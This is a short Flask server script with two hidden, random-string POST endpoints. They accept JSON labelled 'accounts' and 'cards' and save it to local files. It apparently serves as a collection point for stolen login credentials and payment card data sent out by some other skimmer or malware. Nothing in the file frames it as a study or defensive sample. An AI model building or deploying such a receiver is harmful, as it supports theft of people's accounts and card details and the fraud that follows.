from flask import Flask, request, jsonify
import json

app = Flask(__name__)

@app.route('/merrxvb8xza44jxyq6bizhnihz249r', methods=['POST'])
def get_accounts():
    data = request.get_json()
    with open('accounts.json', 'w') as f:
        json.dump(data, f)
    return jsonify({"message": "Accounts received"}), 200

@app.route('/rj2adzdynz4wd215y0kq0tvb15hciz', methods=['POST'])
def get_cards():
    data = request.get_json()
    with open('cards.json', 'w') as f:
        json.dump(data, f)
    return jsonify({"message": "Cards received"}), 200

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)